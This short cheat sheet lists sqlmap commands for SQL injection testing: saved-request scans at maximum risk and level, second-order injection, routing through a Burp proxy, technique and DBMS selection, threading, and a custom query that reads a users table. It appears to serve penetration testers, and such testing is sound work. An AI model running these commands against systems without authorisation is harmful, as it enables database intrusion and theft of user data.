
# Save your request to a file
# Then do 
sqlmap -r ./client_filter.txt --risk=3 --level=5 -v


# If the result must be found with another request, it is called second order:
sqlmap -r ./client_filter.txt --risk=3 --level=5 -v --second-req ./get_clients.req 


# Debug the requests with your burp proxy
sqlmap -r ./client_filter.txt --risk=3 --level=5 -v --proxy=http://127.0.0.1:8080

# Specify the technique to use:
--technique="BEUSTQ"

# Force the the dbms during detection:
--dbms=mysql

# Multi-thread for faster exploitation of blinds
--threads=5

# Make a custom SQL query
--sql-query='SELECT * from users'
